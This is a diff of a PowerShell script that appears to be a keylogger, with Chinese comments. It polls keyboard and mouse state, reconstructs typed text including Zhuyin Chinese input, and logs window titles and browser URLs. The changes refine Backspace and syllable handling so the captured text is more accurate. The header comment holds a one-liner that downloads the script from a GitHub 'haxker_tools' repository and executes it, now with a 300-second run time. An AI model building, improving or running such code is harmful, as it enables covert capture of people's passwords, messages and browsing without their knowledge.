@@ -1,5 +1,5 @@
 # 請使用以下方法進行參數傳送
-# & ([scriptblock]::Create((iwr -UseBasicParsing "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/input_log/log.txt").Content)) -time 10
+# & ([scriptblock]::Create((iwr -UseBasicParsing "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/input_log/log.txt").Content)) -time 300
 
 param(
     [Parameter(Mandatory=$true)]
@@ -94,7 +94,6 @@ public class $className {
                     string name = element.Current.Name;
                     string type = element.Current.LocalizedControlType;
 
-                    // 若當前子元件無名稱，嘗試往上抓取父階層控制項名稱
                     if (string.IsNullOrEmpty(name)) {
                         try {
                             AutomationElement parent = TreeWalker.ControlViewWalker.GetParent(element);
@@ -369,10 +368,11 @@ function Get-CurrentLanguage {
     return "$langName$imeMode"
 }
 
-# 建立按鍵文字緩衝區
+# 建立按鍵文字緩衝區與音節清單
 $textBuffer = New-Object System.Text.StringBuilder
+$script:committedTokens = New-Object System.Collections.Generic.List[string]
 
-# --- 自訂注音鍵盤對照表（使用全小寫避免 PS Hashtable Case-Insensitive 重複 Key 錯誤） ---
+# --- 自訂注音鍵盤對照表（全小寫避免 PowerShell Hashtable 重複 Key 錯誤） ---
 $zhuyinInitials = @{
     '1'='ㄅ'; 'q'='ㄆ'; 'a'='ㄇ'; 'z'='ㄈ'
     '2'='ㄉ'; 'w'='ㄊ'; 's'='ㄋ'; 'x'='ㄌ'
@@ -409,6 +409,7 @@ function Commit-ZhuyinSyllable([string]$tone = "") {
     $syllable = "$script:zhInitial$script:zhMedial$script:zhFinal$tone"
     if ($syllable.Length -gt 0) {
         $null = $textBuffer.Append($syllable)
+        $script:committedTokens.Add($syllable)
     }
     $script:zhInitial = ""
     $script:zhMedial  = ""
@@ -424,6 +425,7 @@ function Flush-TextBuffer {
             Write-Host "$(Get-TimeStamp)📝 [輸入文字段落] -> `"$str`"" -ForegroundColor Yellow
         }
         $null = $textBuffer.Clear()
+        $script:committedTokens.Clear()
     }
 }
 
@@ -480,14 +482,13 @@ while ($true) {
         $canErasePreviousSinglePress = $false
         Write-Host "$(Get-TimeStamp)$($winInfo.Formatted)" -ForegroundColor Cyan
 
-        # 切換視窗時偵測瀏覽器網址
         $lastUrl = $type::GetBrowserUrl($winInfo.Hwnd, $winInfo.Process)
         if ($lastUrl) {
             Write-Host "$(Get-TimeStamp)🌐 [瀏覽器網址] -> $lastUrl" -ForegroundColor Green
         }
     }
 
-    # 2. 瀏覽器內部網址變更持續監控 (每 0.8 秒輪詢)
+    # 2. 瀏覽器內部網址變更持續監控
     if ($winInfo -and ([DateTime]::Now - $lastUrlCheckTime).TotalMilliseconds -gt 800) {
         $lastUrlCheckTime = [DateTime]::Now
         $currentUrl = $type::GetBrowserUrl($winInfo.Hwnd, $winInfo.Process)
@@ -534,7 +535,7 @@ while ($true) {
         }
     }
 
-    # 5. 高效能鍵盤與滑鼠按鍵掃描 (2ms 輪詢)
+    # 5. 高效能鍵盤與滑鼠按鍵掃描
     $null = $type::GetKeyboardState($keyStateBuffer)
 
     for ($vk = 1; $vk -le 254; $vk++) {
@@ -560,6 +561,7 @@ while ($true) {
 
                     if ($vk -eq 8) { # Backspace 刪除鍵
                         if ($isChineseMode -and ($script:zhInitial -or $script:zhMedial -or $script:zhFinal)) {
+                            # 正在拼音中：倒退刪除最後一個拼音部件
                             if ($script:zhHistory.Count -gt 0) {
                                 $lastSlot = $script:zhHistory[$script:zhHistory.Count - 1]
                                 $script:zhHistory.RemoveAt($script:zhHistory.Count - 1)
@@ -569,8 +571,17 @@ while ($true) {
                                     'F' { $script:zhFinal   = "" }
                                 }
                             }
-                        } elseif ($textBuffer.Length -gt 0) {
-                            $null = $textBuffer.Remove($textBuffer.Length - 1, 1)
+                        } else {
+                            # 拼音緩衝區為空：完整倒退刪除上一顆已上字的整組音節
+                            if ($script:committedTokens.Count -gt 0) {
+                                $lastToken = $script:committedTokens[$script:committedTokens.Count - 1]
+                                $script:committedTokens.RemoveAt($script:committedTokens.Count - 1)
+                                if ($textBuffer.Length -ge $lastToken.Length) {
+                                    $null = $textBuffer.Remove($textBuffer.Length - $lastToken.Length, $lastToken.Length)
+                                }
+                            } elseif ($textBuffer.Length -gt 0) {
+                                $null = $textBuffer.Remove($textBuffer.Length - 1, 1)
+                            }
                         }
                     } elseif ($vk -eq 13 -or $vk -eq 9 -or $vk -eq 27) { # Enter / Tab / ESC 觸發 Flush
                         Flush-TextBuffer
@@ -587,6 +598,7 @@ while ($true) {
                                             Commit-ZhuyinSyllable $zhuyinTones[' ']
                                         } else {
                                             $null = $textBuffer.Append(" ")
+                                            $script:committedTokens.Add(" ")
                                         }
                                     } else {
                                         if ($hasZhBuffer) {
@@ -594,6 +606,7 @@ while ($true) {
                                         } else {
                                             Commit-ZhuyinSyllable
                                             $null = $textBuffer.Append($ch)
+                                            $script:committedTokens.Add($ch)
                                         }
                                     }
                                 } elseif ($zhuyinInitials.ContainsKey($chLower)) {
@@ -601,7 +614,15 @@ while ($true) {
                                     if ($script:zhHistory.Contains('I')) { $script:zhHistory.Remove('I') }
                                     $script:zhHistory.Add('I')
                                 } elseif ($zhuyinMedials.ContainsKey($chLower)) {
-                                    $script:zhMedial = $zhuyinMedials[$chLower]
+                                    $medialChar = $zhuyinMedials[$chLower]
+                                    # 若輸入介母 ㄨ，自動清除不相容的舊韻母 (如 ㄜ)
+                                    if ($script:zhFinal -and $medialChar -eq 'ㄨ') {
+                                        $validFinalsForU = @('ㄚ', 'ㄛ', 'ㄞ', 'ㄟ', 'ㄢ', 'ㄣ', 'ㄤ', 'ㄥ')
+                                        if ($validFinalsForU -notcontains $script:zhFinal) {
+                                            $script:zhFinal = ""
+                                        }
+                                    }
+                                    $script:zhMedial = $medialChar
                                     if ($script:zhHistory.Contains('M')) { $script:zhHistory.Remove('M') }
                                     $script:zhHistory.Add('M')
                                 } elseif ($zhuyinFinals.ContainsKey($chLower)) {
@@ -611,9 +632,11 @@ while ($true) {
                                 } else {
                                     Commit-ZhuyinSyllable
                                     $null = $textBuffer.Append($ch)
+                                    $script:committedTokens.Add($ch)
                                 }
                             } else {
                                 $null = $textBuffer.Append($ch)
+                                $script:committedTokens.Add($ch)
                             }
                         }
                     }
